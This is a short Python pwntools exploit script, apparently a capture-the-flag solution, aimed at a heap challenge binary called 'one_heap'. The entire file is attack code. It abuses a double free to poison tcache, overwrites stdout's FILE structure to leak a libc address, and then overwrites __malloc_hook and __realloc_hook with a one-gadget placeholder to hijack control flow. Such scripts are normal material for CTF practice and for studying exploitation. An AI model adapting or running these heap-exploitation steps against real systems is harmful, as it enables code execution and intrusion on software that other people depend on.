#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './one_heap'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


def new(sz, cont):
    io.recvuntil("choice:")
    io.sendline('1')
    io.recvuntil("size:")
    io.sendline(str(sz))
    io.recvuntil("content:")
    io.sendline(cont)

def delete():
    io.recvuntil("choice:")
    io.sendline('2')


new(0x60, 'a' * 8)
delete()
delete()
new(0x60, '\x20\x60')
new(0x60, 'b' * 8)
sleep(0.5)
new(0x60, '\x60\x77')
pay = p64(0xfbad1880) + p64(0)*3 + "\x00"
new(0x60, pay)
io.recvn(8)
libc_addr = myu64(io.recvn(8)) - 0x3ed8b0
print(hex(libc_addr))
malloc_hook = libc.symbols["__malloc_hook"] + libc_addr
relloc_hook = libc.symbols["__realloc_hook"] + libc_addr
print(hex(malloc_hook))

one = 0xdeadbeef
new(0x50, 'a')
delete()
delete()
new(0x50, p64(relloc_hook))
new(0x50, "peanuts")
new(0x50, p64(one) + p64(libc_addr + libc.sym['realloc'] + 0xe))
gdb.attach(io)
new(0x30, 'x')

io.interactive()
